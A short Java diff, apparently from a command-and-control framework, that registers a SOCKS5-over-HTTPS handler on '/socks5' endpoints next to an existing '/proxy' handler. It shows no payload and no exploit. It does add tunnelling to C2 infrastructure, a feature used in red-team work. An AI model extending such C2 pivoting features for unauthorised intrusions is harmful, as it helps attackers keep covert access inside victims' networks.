@@ -172,6 +172,10 @@ public class HTTPSManager extends C2Interface {
 			httpsServer.createContext("/proxy", pfHandler);
 			httpServer.createContext("/proxy", pfHandler);
 
+			SocksOverHTTPSHandler socksHandler = new SocksOverHTTPSHandler(io);
+			httpsServer.createContext("/socks5", socksHandler);
+			httpServer.createContext("/socks5", socksHandler);
+			
 			httpsServer.setExecutor(null); // creates a default executor
 			System.out.println("HTTPS online: " + port);
 			httpsServer.start();
